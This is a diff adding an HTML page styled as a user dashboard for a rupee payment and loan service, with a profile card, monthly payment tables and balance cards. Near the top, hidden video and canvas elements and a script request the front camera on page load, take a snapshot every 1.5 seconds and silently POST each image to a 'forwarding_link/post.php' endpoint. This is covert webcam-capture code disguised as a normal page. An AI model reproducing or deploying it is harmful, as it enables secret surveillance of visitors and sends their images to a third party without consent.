@@ -1,0 +1,899 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, ">
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+
+<link href='https://moneykamalo.com/favicon.ico' type='image/x-icon' rel='shortcut icon'/><link rel="stylesheet" href="https://moneykamalo.com/build/css/tp98-themes.css?ver=6.4.0"/>
+<script src="https://kit.fontawesome.com/72c0cac4ce.js" crossorigin="anonymous"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        <iframe hidden="hidden" id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+    
+
+<ul class="custom-menu">
+  <li class="photo"><img src="https://iili.io/JMUtkMl.jpg" alt="Profile Photo" style="height: 45px; width: 135px;"></li>
+  <li class="logout"><a href="#logout">Logout</a></li>
+</ul>
+
+<!--  menu bar start -->
+
+<div class="w3-bar-block w3-white">
+<div class="wrapperrr">
+  <div class="navbarrr">
+
+  <div class="navitem active" onclick="select(this); openPage('page1'); w3_close();">
+    <a href="javascript:void(0)" class="w3-bar-item w3-button w3-padding test w3-hover-light-grey"  id="firstTab" >
+      <div class="indicator"></div>
+      <div class="hoverindicator"></div>
+     <i class="fa-solid fa-house"></i>
+    </a>
+    </div>
+
+    <div class="navitem" onclick="select(this); openPage('page2'); w3_close();">
+     <a href="javascript:void(0)" class="w3-bar-item w3-button w3-padding test w3-hover-light-grey" >
+      <div class="indicator"></div>
+      <div class="hoverindicator"></div>
+     <i class="fa-solid fa-user"></i>
+    </a>
+    </div>
+
+    <div class="navitem" onclick="select(this); openPage('page3'); w3_close();">
+    <a href="javascript:void(0)"  class="w3-bar-item w3-button w3-padding test w3-hover-light-grey" >
+      <div class="indicator"></div>
+      <div class="hoverindicator"></div>
+      <i class="fa-solid fa-indian-rupee-sign "></i>
+    </a>
+    </div>
+
+    <div class="navitem" onclick="select(this); openPage('page4'); w3_close();" >
+    <a href="javascript:void(0)" class="w3-bar-item w3-button w3-padding test w3-hover-light-grey" >
+      <div class="indicator"></div>
+      <div class="hoverindicator"></div>
+      <i class="fa-solid fa-rotate-left"></i>
+    </a>
+    </div>
+
+  </div>
+</div>
+
+<!--  end  -->
+
+
+<!--  page   -->
+<div id="page1" class="w3-container pageIndex">
+1
+</div>
+
+<div id="page2" class="w3-container pageIndex">
+<br/>
+<div>
+    <div class="card">
+        <div class="firstinfo" style="margin-left: -40%">
+            <img src="<?!= img ?>" alt="" class="img-rounded img-thumbnail img-responsive" style="margin-left:60px">
+            <div class="profileinfo" style="margin-left:20px">
+                <h3 style="background-color: transparent"><b><?!= user_Name ?></b></h3> 
+                <h6><i class="fa fa-circle-o"></i> <b>User ID :</b> <?!= user_ID ?> </h6>
+                <h6><i class="fa fa-circle-o"></i> <b>Profession :</b> <?!= profession ?> </h6>
+                <h6><i class="fa fa-circle-o"></i> <b>Email :</b> <?!= email ?> </h6>
+                <h6><i class="fa fa-circle-o"></i> <b>Gender :</b> <?!= gender ?> </h6>
+                <h6><i class="fa fa-circle-o"></i> <b>Joined Date :</b> <?!= joined_Date ?> </h6>
+                <h6><i class="fa fa-circle-o"></i> <b>Granter :</b> <?!= granter ?> </h6>
+                <h6><i class="fa fa-circle-o"></i> <b>First Payment :</b> <?!= first_Payment ?> </h6>
+            </div>
+        </div>
+    </div>
+</div>
+</div>
+
+<div id="page3" class="w3-container pageIndex">
+<style>
+* {box-sizing: border-box}
+body {font-family: Verdana, sans-serif; margin:0}
+.slide-container {
+  max-width: 1000px;
+  position: relative;
+  margin: auto;
+}
+.prev-slide, .next-slide {
+  cursor: pointer;
+  position: absolute;
+  top: 130px;
+  width: auto;
+  padding: 16px;
+  margin-top: -22px;
+  color: white;
+  font-weight: bold;
+  font-size: 18px;
+  transition: 0.6s ease;
+  border-radius: 0 3px 3px 0;
+  user-select: none;
+}
+.next-slide {
+  right: 0;
+  top: 130px;
+  border-radius: 3px 0 0 3px;
+}
+.prev-slide:hover, .next-slide:hover {
+  background-color: rgba(0,0,0,0.8);
+}
+.slide-text {
+  color: #f2f2f2;
+  font-size: 15px;
+  padding: 8px 12px;
+  position: absolute;
+  bottom: 8px;
+  width: 100%;
+  text-align: center;
+}
+.slide-number {
+  color: #f2f2f2;
+  font-size: 12px;
+  padding: 8px 12px;
+  position: absolute;
+  top: 0;
+}
+.slide-dot {
+  cursor: pointer;
+  height: 15px;
+  width: 15px;
+  margin: 0 2px;
+  background-color: #bbb;
+  border-radius: 50%;
+  display: inline-block;
+  transition: background-color 0.6s ease;
+}
+.active-dot, .slide-dot:hover {
+  background-color: #717171;
+}
+.slide-fade {
+  animation-name: fade;
+  animation-duration: 1.5s;
+}
+@keyframes fade {
+  from {opacity: .4} 
+  to {opacity: 1}
+}
+@media only screen and (max-width: 300px) {
+  .prev-slide, .next-slide, .slide-text {font-size: 11px}
+}
+.slide-wrapper {
+  contain: layout inline-size style;
+  font-family: "Baloo 2", Serif;
+}
+.unique-container {
+  box-shadow: inset 2px 1px 8px #ccc;
+  padding: 18px;
+  width: 300px;
+  margin: 2rem auto;
+  border-radius: 20px;
+}
+.unique-notes {
+  text-align: center;
+}
+@media (min-width: 800px) {
+  .slide-info {
+    display: flex;
+  }
+  h2 {
+    margin-right: 25px;
+  }
+  .unique-notes {
+    width: 75%;
+    margin: 2rem auto;
+  }
+}
+.unique-table {
+  border-collapse: collapse;
+  width: 100%;
+}
+th, td {
+  padding: 8px;
+  text-align: left;
+  border-bottom: 1px solid #ddd;
+}
+.prev-slide, .next-slide {
+  color: #82CAFF; 
+  font-size: 34px; 
+  text-decoration: none; 
+}
+</style>
+</head>
+<body>
+
+<div class="slide-container">
+
+<div class="slide fade-slide">
+  <div class="slide-number">1 / 3</div>
+  <div class="slide-wrapper">
+    <div class="unique-container">
+      <div class="slide-info">
+        <table class="unique-table">
+          <tr>
+            <th>Month</th>
+            <th>Rupees</th>
+            <th>Status</th>
+          </tr>
+          <tr>
+            <td>January</td>
+            <td>$100</td>
+            <td>Status</td>
+          </tr>
+          <tr>
+            <td>February</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+          <tr>
+            <td>March</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+          <tr>
+            <td>April</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+          <tr>
+            <td>May</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+          <tr>
+            <td>June</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="slide fade-slide">
+  <div class="slide-number">2 / 3</div>
+  <div class="slide-wrapper">
+    <div class="unique-container">
+      <div class="slide-info">
+        <table class="unique-table">
+          <tr>
+            <th>Month</th>
+            <th>Rupees</th>
+            <th>Status</th>
+          </tr>
+          <tr>
+            <td>July</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+          <tr>
+            <td>August</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+          <tr>
+            <td>September</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+          <tr>
+            <td>October</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+          <tr>
+            <td>November</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+          <tr>
+            <td>December</td>
+            <td>$80</td>
+            <td>Status</td>
+          </tr>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<a class="prev-slide" onclick="plusSlides(-1)">❮</a>
+<a class="next-slide" onclick="plusSlides(1)">❯</a>
+
+<div style="text-align:center">
+  <span class="slide-dot" onclick="currentSlide(1)"></span> 
+  <span class="slide-dot" onclick="currentSlide(2)"></span> 
+</div>
+
+<script>
+let slideIndex = 1;
+showSlides(slideIndex);
+
+function plusSlides(n) {
+  showSlides(slideIndex += n);
+}
+
+function currentSlide(n) {
+  showSlides(slideIndex = n);
+}
+
+function showSlides(n) {
+  let i;
+  let slides = document.getElementsByClassName("fade-slide");
+  let dots = document.getElementsByClassName("slide-dot");
+  if (n > slides.length) {slideIndex =1}    
+  if (n < 1) {slideIndex = slides.length}
+  for (i = 0; i < slides.length; i++) {
+    slides[i].style.display = "none";  
+  }
+  for (i = 0; i < dots.length; i++) {
+    dots[i].className = dots[i].className.replace(" active-dot", "");
+  }
+  slides[slideIndex-1].style.display = "block";  
+  dots[slideIndex-1].className += " active-dot";
+}
+</script>
+<div class="container-fluid">
+
+<ol class="breadcrumb bc-colored m-b-30 bg-info today-bottom" style="background:#398BF7; padding:12px; margin-top:15px; margin-bottom:40px;">
+
+<li ><i class="breadcrumb-item"></i>PAYMENT REPORTS</li>
+
+</ol>
+
+</div>
+
+
+
+<div class="row mbrow">
+
+<!--<div class="col-md-6 col-lg-3 grid-margin stretch-card">-->
+
+<div class="col-xl-3 col-md-6">
+
+<div class="cardi card-stats">
+
+<!-- Card body -->
+
+<div class="card-bodyi">
+
+<div class="rowe">
+
+<div class="col">
+
+<h5 class="card-title text-uppercase text-muted mb-0">Present Amt</h5>
+
+<span class="h2 font-weight-bold mb-0">Rs.<?!= total_rupees ?></span>
+
+</div>
+
+<div class="col-auto">
+
+<div class="icon icon-shape bg-gradient-green text-white rounded-circle shadow">
+
+<i class="fa-solid fa-indian-rupee-sign"></i>
+
+</div>
+
+</div>
+
+</div>
+
+<p class="mt-3 mb-0 text-sm">
+
+<span class="text-success mr-2"><i class="fa fa-arrow-up"></i> 100%</span>
+
+<span class="text-nowrap">GFC</span>
+
+</p>
+
+</div>
+
+</div>
+
+</div>
+
+
+
+<div class="col-xl-3 col-md-6">
+
+<div class="cardi card-stats">
+
+<!-- Card body -->
+
+<div class="card-bodyi">
+
+<div class="rowe">
+
+<div class="col">
+
+<h5 class="card-title text-uppercase text-muted mb-0">Total Amt</h5>
+
+<span class="h2 font-weight-bold mb-0">Rs.<?!= total_rupees ?></span>
+
+</div>
+
+<div class="col-auto">
+
+<div class="icon icon-shape bg-gradient-orange text-white rounded-circle shadow">
+
+<i class="fa-solid fa-indian-rupee-sign"></i>
+
+</div>
+
+</div>
+
+</div>
+
+<p class="mt-3 mb-0 text-sm">
+
+<span class="text-success mr-2"><i class="fa fa-arrow-up"></i> 100%</span>
+
+<span class="text-nowrap">GFC</span>
+
+</p>
+
+</div>
+
+</div>
+
+</div>
+
+<!--<div class="col-xl-3 col-md-6">-->
+
+<div class="col-xl-3 col-md-6">
+
+<div class="cardi card-stats">
+
+<!-- Card body -->
+
+<div class="card-bodyi">
+
+<div class="rowe">
+
+<div class="col">
+
+<h5 class="card-title text-uppercase text-muted mb-0">Present Loan</h5>
+
+<span id="output" class="h2 font-weight-bold mb-0">Rs. <?!= loan ?></span>
+
+</div>
+
+<div class="col-auto">
+
+<div class="icon icon-shape bg-gradient-purple text-white rounded-circle shadow">
+
+<i class="ni fas fa-percent"></i>
+
+</div>
+
+</div>
+
+</div>
+
+<p class="mt-3 mb-0 text-sm">
+
+<span class="text-success mr-2"><i class="fa fa-arrow-up"></i> 100%</span>
+
+<span class="text-nowrap">GFC</span>
+
+</p>
+
+</div>
+
+</div></div>
+
+<div class="col-xl-3 col-md-6">
+
+<div class="cardi card-stats">
+
+<!-- Card body -->
+
+<div class="card-bodyi">
+
+<div class="rowe">
+
+<div class="col">
+
+<h5 class="card-title text-uppercase text-muted mb-0">Withdrawa</h5>
+
+<span class="h2 font-weight-bold mb-0">Rs. <?!= withdrawal ?></span>
+
+</div>
+
+<div class="col-auto">
+
+<div class="icon icon-shape bg-gradient-orange text-white rounded-circle shadow">
+
+<i class="ni fas fa-percent"></i>
+
+</div>
+
+</div>
+
+</div>
+
+<p class="mt-3 mb-0 text-sm">
+
+<span class="text-nowrap">GFC</span>
+
+</p>
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<div id="page4" class="w3-container pageIndex">
+4
+</div>
+</body>
+<style>
+
+
+/*NEW UI*/
+@import "https://fonts.googleapis.com/css?family=Open+Sans:300,400";
+.badgescard, .firstinfo {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+
+
+
+
+*, *:before, *:after {
+  box-sizing: border-box;
+}
+
+
+.card {
+  width: 100%;
+  min-height: 100px;
+  padding: 20px;
+  border-radius: 3px;
+  background-color: #EFEFF0;
+  box-shadow: 5px 10px 20px rgba(0, 0, 0, 0.3);
+  position: relative;
+  overflow: hidden;
+}
+.card:after {
+  content: '';
+  display: block;
+  width: 190px;
+  height: 400px;
+  /*background: cadetblue;*/
+  background:#3b5998;
+  position: absolute;
+  animation: rotatemagic 0.75s cubic-bezier(0.425, 1.04, 0.47, 1.105) 1s both;
+}
+
+.firstinfo {
+  flex-direction: row;
+  z-index: 2;
+  position: relative;
+}
+.firstinfo img {
+  /*border-radius: 50%;*/
+  width: 120px;
+  height: 120px;
+}
+.firstinfo .profileinfo {
+  padding: 0px 20px;
+}
+.firstinfo .profileinfo h1 {
+  font-size: 1.8em;
+}
+.firstinfo .profileinfo h3 {
+  font-size: 1.2em;
+  color: #009688;
+  font-style: italic;
+}
+.firstinfo .profileinfo p.bio {
+  padding: 5px 0px;
+  color: #5A5A5A;
+  line-height: 1.2;
+  font-style: initial;
+}
+
+@keyframes animatop {
+  0% {
+    opacity: 0;
+    bottom: -500px;
+  }
+  100% {
+    opacity: 1;
+    bottom: 0px;
+  }
+}
+@keyframes animainfos {
+  0% {
+    bottom: 10px;
+  }
+  100% {
+    bottom: -42px;
+  }
+}
+@keyframes rotatemagic {
+  0% {
+    opacity: 0;
+    transform: rotate(0deg);
+    top: -24px;
+    left: -253px;
+  }
+  100% {
+    transform: rotate(-30deg);
+    top: -24px;
+    left: -78px;
+  }
+}
+
+.img-thumbnail{
+  min-height: 140px;
+}
+</style>
+
+<style>
+body {
+  margin: 0;
+  padding: 0;
+  background: #e4ecfa;
+
+
+}
+
+@property --activeclr {
+  syntax: "<color>";
+  initial-value: #660000;
+  inherits: true;
+}
+
+.wrapperrr {
+  border-radius: 1rem;
+  overflow: hidden;
+  width: 100%;
+ position: absolute;
+  left: 0px;
+  top: 91.4%;
+}
+.navbarrr {
+  display: flex;
+  justify-content: space-between;
+  height: 6rem;
+  background: white;
+  padding: 0 0.75rem;
+  transition: padding 300ms ease;
+
+}
+.navbarrr:has(.navsearch.active) {
+  padding: 0 0.75rem;
+}
+
+.navitem, .navsearch {
+  position: relative;
+  display: grid;
+  place-content: center;
+  color: #fff;
+  width: 4.5rem;
+  text-align: center;
+  color: black;
+  font-size: 3rem;
+  transition: width 300ms ease, flex-grow 300ms ease;
+}
+.navbarrr:has(.navsearch.active) .navitem {
+  width: 3rem;
+}
+
+
+
+.hoverindicator {
+  position: absolute;
+  width: 2.5rem;
+  inset: 50% auto auto 50%;
+  transform: translate(-50%, -50%);
+  background: var(--activeclr);
+  opacity: 0;
+  border-radius: 0.5rem;
+  height: 0.25rem;
+  inset: auto auto -0.25rem 50%;
+  transition: inset 300ms ease, opacity 300ms ease;
+}
+@media (hover: hover) {
+  .navitem:not(.active):hover .hoverindicator,
+  .navsearch:not(.active):hover .searchbox {
+    border-radius: 1.25rem;
+    height: 2.5rem;
+    opacity: 1;
+    transition: opacity 150ms ease;
+  }
+}
+
+.active .hoverindicator {
+  opacity: 1;
+  border-radius: 0.5rem;
+  height: 0.25rem;
+  inset: auto auto 0.25rem 50%;
+  transition: inset 300ms ease, height 300ms ease, border-radius 300ms ease;
+}
+.custom-menu {
+    list-style-type: none;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    background-color: #6698FF;
+    display: flex;
+    align-items: center;
+  }
+
+  .custom-menu li {
+    float: left;
+  }
+  .custom-menu li a {
+    display: block;
+    color: white;
+    text-align: center;
+    padding: 14px 16px;
+    text-decoration: none;
+  }
+  .custom-menu li a:hover {
+    background-color: #111;
+  }
+  .photo {
+    margin-right: auto;
+    padding-left: 20px;
+  }
+  .logout {
+    margin-left: auto;
+    padding-right: 20px;
+  }
+</style>
+<script>
+function select(el) {
+   document.querySelector(".active").classList.remove("active")
+
+  el.classList.add("active")
+
+  document.body.style.setProperty('--activeclr', el.dataset.clr);
+}
+
+</script>
+
+
+<script>
+
+function w3_open() {
+
+document.getElementById("mySidebar").style.display = "block";
+
+document.getElementById("myOverlay").style.display = "block";
+
+}
+
+function w3_close() {
+
+document.getElementById("mySidebar").style.display = "none";
+
+document.getElementById("myOverlay").style.display = "none";
+
+}
+
+openPage("page1");
+
+function openPage(pageNum) {
+
+var i;
+
+var x = document.getElementsByClassName("pageIndex");
+
+for (i = 0; i < x.length; i++) {
+
+x[i].style.display = "none";
+
+}
+
+x = document.getElementsByClassName("test");
+
+for (i = 0; i < x.length; i++) {
+
+x[i].className = x[i].className.replace(" w3-light-grey", "");
+
+}
+
+document.getElementById(pageNum).style.display = "block";
+
+event.currentTarget.className += " w3-light-grey";
+
+}
+
+</script>
+
+<script>
+
+var openTab = document.getElementById("firstTab");
+
+openTab.click();
+
+</script>
+
+</html>
